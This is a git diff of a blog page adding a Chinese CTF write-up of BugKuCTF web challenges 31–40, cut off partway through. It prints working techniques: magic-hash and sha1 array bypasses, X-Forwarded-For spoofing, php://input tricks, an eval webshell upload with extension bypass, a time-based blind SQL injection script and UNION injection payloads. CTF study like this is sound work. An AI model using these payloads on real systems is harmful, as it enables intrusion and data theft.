@@ -134,19 +134,234 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-BugKuCTF—杂项题中常见的文件操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-BugKuCTF—Web题 第31-40关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/04/10/BugKuCTF—Web题 第31-40关/">BugKuCTF — Web题(第31-40关)</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/" class="archive-article-date">
+        <a href="/Knlvre.github-io/2019/04/10/BugKuCTF—Web题 第31-40关/" class="archive-article-date">
+  	<time datetime="2019-04-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/03/28/BugKuCTF%E2%80%94Web%E9%A2%98%20%E7%AC%AC21-30%E5%85%B3/">第21-30关Write-up</a></p>
+<h3 id="第三十一关（md5-collision-NUPT-CTF-）"><a href="#第三十一关（md5-collision-NUPT-CTF-）" class="headerlink" title="第三十一关（md5 collision(NUPT_CTF)）"></a>第三十一关（md5 collision(NUPT_CTF)）</h3><p>我打开题目是没有给任何提示的，只有链接进去提示<code>&quot;please input a&quot;</code>，源代码也没有写任何东西</p>
+<p>去找别人的WriteUp，别人做题可以看到提示代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>那就是<code>$a</code>的值不等于<code>QNKCDZO</code>，但是<code>md5</code>加密后的值却要与之相等，只要找到经过md5加密后<code>0e开头的</code>值就行 </p>
+<p>这里列举一些比较常用的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">加密前字符串：</span><br><span class="line">md5加密后密文：</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>
+<p>这些原值当中随意选择一个提交上去就可以了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/1-1.png" alt="1-1"></p>
+<h3 id="第三十二关（程序员本地网站）"><a href="#第三十二关（程序员本地网站）" class="headerlink" title="第三十二关（程序员本地网站）"></a>第三十二关（程序员本地网站）</h3><p>链接进去，提示<code>请从本地访问！</code>。这个时候就行到了HTTP请求头的<code>X-Forwarded-For</code>字段，给出百度的解释：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</span><br><span class="line"></span><br><span class="line">X-Forwarded-For: client1, proxy1, proxy2, proxy3</span><br><span class="line">其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。 在上面这个例子中，这个请求成功通过了三台代理服务器：proxy1, proxy2 及 proxy3。请求由client1发出，到达了proxy3(proxy3可能是请求的终点)。请求刚从client1中发出时，XFF是空的，请求被发往proxy1；通过proxy1的时候，client1被添加到XFF中，之后请求被发往proxy2;通过proxy2的时候，proxy1被添加到XFF中，之后请求被发往proxy3；通过proxy3时，proxy2被添加到XFF中，之后请求的的去向不明，如果proxy3不是请求终点，请求会被继续转发。</span><br><span class="line">鉴于伪造这一字段非常容易，应该谨慎使用X-Forwarded-For字段。正常情况下XFF中最后一个IP地址是最后一个代理服务器的IP地址, 这通常是一个比较可靠的信息来源。</span><br></pre></td></tr></table></figure>
+<p>简单的说，通过这个字段，我们可以伪造假的<code>请求来源IP地址</code></p>
+<p>题目要求从本地访问，那就是<code>127.0.0.1</code>，在HTTP请求头添加<code>X-Forwarded-For</code>字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For：127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>拿下flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/2-1.png" alt="2-1"></p>
+<h3 id="第三十三关（各种绕过）"><a href="#第三十三关（各种绕过）" class="headerlink" title="第三十三关（各种绕过）"></a>第三十三关（各种绕过）</h3><p>链接进去看到代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>); </span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]); </span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>]) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>)) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>要求：id的值经过urldecode之后等于margin，uname和passwd的值不相等，但是经过sha1()之后要想等</p>
+<p>思路：英文单词再怎么编码都是原来的单词，中文和符号就会因为编码改变。利用数组绕过sha1()</p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=margin&amp;uname[]=1</span><br><span class="line"></span><br><span class="line">//POST passwd的值：passwd[]=2</span><br></pre></td></tr></table></figure>
+<p>拿下flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/3-1.png" alt="3-1"></p>
+<h3 id="第三十四关（web8）"><a href="#第三十四关（web8）" class="headerlink" title="第三十四关（web8）"></a>第三十四关（web8）</h3><p>链接进去看到代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))&#123;</span><br><span class="line">	$f = trim(file_get_contents($fn));</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> ($ac === $f)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>trim()</code>函数：只传入参数没有额外写模式时，就是默认去掉空格</p>
+<p>看到<code>file_get_contents</code>，想到<code>PHP伪协议（php://input）</code>，第<code>二十四关</code>有提到</p>
+<p>题目提示<code>txt</code>，那应该就是<code>flag.txt</code>了，构造<code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?fn=php://input&amp;ac=flag.txt</span><br><span class="line"></span><br><span class="line">//请求主体中提交字符串：flag.txt</span><br></pre></td></tr></table></figure>
+<p>拿下flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/4-1.png" alt="4-1"></p>
+<h3 id="第三十五关（细心）"><a href="#第三十五关（细心）" class="headerlink" title="第三十五关（细心）"></a>第三十五关（细心）</h3><p>链接进去只看到以下内容，两个按钮点进去也没有任何帮助</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/5-1.png" alt="5-1"></p>
+<p>但是看到其中的文字提示<code>No such file or directory</code>，应该是一个文件或者目录的查找操作</p>
+<p>用<code>御剑</code>扫描一下，发现<code>robots.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/5-2.png" alt="5-2"></p>
+<p>访问一下，看到<code>resusl.php</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/5-3.png" alt="5-3"></p>
+<p>访问一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/5-4.png" alt="5-4"></p>
+<p>查看源代码，没有获得有用信息。用Burpsuits加上X-Forwarded-For：127.0.0.1也没用</p>
+<p>最后想到题目提示：<code>想办法变成admin</code>，试一下把x的值设置为admin：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x=admin</span><br></pre></td></tr></table></figure>
+<p>没想到居然成功了，拿到了flag，感觉有点像脑洞题</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/5-5.png" alt="5-5"></p>
+<h3 id="第二十六关（求getshell）"><a href="#第二十六关（求getshell）" class="headerlink" title="第二十六关（求getshell）"></a>第二十六关（求getshell）</h3><p>链接进去看到有上传文件的按钮，并且提示：<code>My name is margin,give me a image file not a php</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/6-1.png" alt="6-1"></p>
+<p>猜测应该是文件上传漏洞，那么与<code>getshell</code>有关的应该是要<code>一句话木马</code>，先写好保存下来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;php @<span class="keyword">eval</span>($_POST[<span class="string">'123'</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>提交的时候用<code>Burpsuits</code>抓取下来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/6-2.png" alt="6-2"></p>
+<p>要求我们上传<code>image</code>，但我们却上传<code>php</code>，所以需要修改头部，以此来欺骗服务器，将我们的文件成功传入</p>
+<p>需要修改的地方有3处：<code>请求头的Content-Type</code>、<code>filename</code>、<code>请求数据的Content-Type</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">求头的Content-Type：将任意的字母改成大写，绕过就可以</span><br><span class="line"></span><br><span class="line">filename：测试过后缀黑名单后（php2, php3, php4, php5，phps, pht, phtm, phtml），发现只有php5可以绕过</span><br><span class="line"></span><br><span class="line">请求数据的Content-Type：改为image/jpeg</span><br></pre></td></tr></table></figure>
+<p>修改完后，就可以成功提交上去。提交完也不用菜刀或蚁剑去连接上传的一句话木马，直接返回flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/6-3.png" alt="6-3"></p>
+<h3 id="第二十七关（INSERT-INTO注入）"><a href="#第二十七关（INSERT-INTO注入）" class="headerlink" title="第二十七关（INSERT INTO注入）"></a>第二十七关（INSERT INTO注入）</h3><p>题目提示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不如写个Python吧</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$ip = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line"> 	   $ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	    $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line">	<span class="keyword">return</span> $ip_arr[<span class="number">0</span>];    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
+<p>参考文章：<a href="https://www.cnblogs.com/sijidou/p/9657026.html" target="_blank" rel="noopener">基于时间注入的Python脚本</a></p>
+<p>结题思路：</p>
+<ol>
+<li>需要用X-Forwarded-For字段来进行注入 </li>
+<li><code>explode()</code>函数的作用是以逗号为分割点，只取第一部分<code>$ip_arr[0]</code>，相当于是过滤了<code>逗号</code></li>
+<li>题目没有其他返回内容，包括报错，所以只能用<code>时间注入</code>，那就真的要写一个Python。</li>
+<li>因为要使用时间注入，但是逗号又被过滤掉了，所以<code>substr()和substring()</code>无法正常使用，但是可以用<code>from 1 for 1</code>代替逗号</li>
+</ol>
+<p>首先，对注入语法有什么疑惑的（我！我有点疑惑），现在本地测试一下。我们同样在本地创建<code>test -&gt; client_ip</code>表</p>
+<p>测试一下注入语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into client_ip (ip) values (&apos;1&apos; + (select case when (ascii(substr(database() from 1 for 1))=116) then sleep(3) else 0 end))#&apos;)</span><br><span class="line">#我们的数据库为：test，所以第一位t的ASCII码为116</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/7-1.png" alt="7-1"></p>
+<p>可以看到，我们将<code>116</code>换成<code>117</code>后，返回时间就变成了0，也就是说不符合条件，得到验证</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/7-2.png" alt="7-2"></p>
+<p>接下来就写个Python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789.+-*/,./&lt;&gt;?'";:]&#125;[&#123;\\|=+-_)(*&amp;^%$#@!~`'''</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">'(select group_concat(table_name) from information_schema.tables where table_schema=database())'</span></span><br><span class="line"><span class="comment">#爆表名：client_ip,flag</span></span><br><span class="line">column = <span class="string">'(select group_concat(column_name) from information_schema.columns where table_name="flag")'</span></span><br><span class="line"><span class="comment">#爆列名：flag</span></span><br><span class="line">data = <span class="string">'(select group_concat(flag) from flag)'</span></span><br><span class="line"><span class="comment">#爆数据：cdbf14c9551d5be5612f7bb5d2867853</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1' + (select case when (ascii(substr(%s from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(data,i,ord(j))	<span class="comment">#data位置根据需要选择字符串变量</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()	<span class="comment">#相应的时间，直接作为判断依据</span></span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">            database = database + j</span><br><span class="line">            <span class="comment">#测试print('the '+str(i)+' place of database is '+j)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'`'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'database:'</span>,database)</span><br></pre></td></tr></table></figure>
+<p>最后得到flag，需要自己加上边框</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/7-3.png" alt="7-3"></p>
+<h3 id="第二十八关（这是一个神奇的登陆框）"><a href="#第二十八关（这是一个神奇的登陆框）" class="headerlink" title="第二十八关（这是一个神奇的登陆框）"></a>第二十八关（这是一个神奇的登陆框）</h3><p>URL提示是SQL注入</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/8-1.png" alt="7-1"></p>
+<p>刚开始对<code>用户名</code>字段注入，<code>单引号</code>、<code>两个单引号</code>都失败，使用<code>双引号</code>才出现报错信息</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/8-2.png" alt="8-2"></p>
+<p>好像没有被包裹，尝试一下，失败</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/8-3.png" alt="8-3"></p>
+<p>用<code>密码</code>字段试一下，可以出现报错信息，发现用<code>双引号</code>包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/8-4.png" alt="8-4"></p>
+<p>加上<code>or 1=1 --+</code>直接给出提示：<code>Login_Name:AdMiNhEhE</code>、<code>You must login with correct ACCOUNT and PASSWORD!</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/8-5.png" alt="8-5"></p>
+<p>直接将用户名改为它要求的哪个，然后用<code>password字段</code>直接注入，比较简单，不再赘述</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2 --+ &amp;submit=GO GO GO</span><br><span class="line">#爆表名：flag1,whoami</span><br><span class="line"></span><br><span class="line">admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_concat(column_name) from information_schema.columns where table_name=&apos;flag1&apos;),2 --+ &amp;submit=GO GO GO</span><br><span class="line">#爆列名：flag1</span><br><span class="line"></span><br><span class="line">admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_concat(flag1) from flag1),2 --+ &amp;submit=GO GO GO</span><br><span class="line">#爆数据：ed6b28e684817d9efcaf802979e57aea</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/8-6.png" alt="8-6"></p>
+<h3 id="第二十九关（多次）"><a href="#第二十九关（多次）" class="headerlink" title="第二十九关（多次）"></a>第二十九关（多次）</h3><p>尝试过程：</p>
